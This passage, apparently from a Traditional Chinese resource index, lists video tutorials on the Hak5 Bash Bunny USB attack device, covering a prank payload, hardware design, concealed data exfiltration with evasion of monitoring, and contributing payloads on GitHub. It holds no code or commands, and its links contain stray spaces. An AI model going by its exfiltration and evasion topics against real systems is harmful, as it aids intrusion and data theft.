### 7.8 1990 年代趣味惡作劇酬載 (1990』s Prank)
* 官方影片教學連結：[https://youtu.be/W8iQ5 N-w9 vQ](https://youtu.be/W8iQ5 N-w9 vQ)
* 經典示範酬載，自動開啟全螢幕復古端點播放動畫。

### 7.9 Bash Bunny 開發幕後秘辛 (Dev Behind the Scenes)
* 官方影片教學連結：[https://youtu.be/z6M8q9vK0 zU](https://youtu.be/z6M8q9vK0 zU)
* Hak5 創始團隊分享多向量 USB 攻擊硬體設計挑戰與架構演進。

### 7.10 口袋型網路隱蔽攻擊與資料外傳 (Concealed Exfiltration)
* 官方影片教學連結：[https://youtu.be/4tG2M8p9 kLQ](https://youtu.be/4tG2M8p9 kLQ)
* 深度探討在全天候受監控環境下進行實體滲透之防禦規避要訣。

### 7.11 撰寫酬載並貢獻至 GitHub 社群 (Contributing on GitHub)
* 官方影片教學連結：[https://youtu.be/7kL3vX9k2 gQ](https://youtu.be/7kL3vX9k2 gQ)
* 如何運用 Git 工具鏈對官方酬載庫提交 Pull Request，參與全球開源資安社群貢獻。
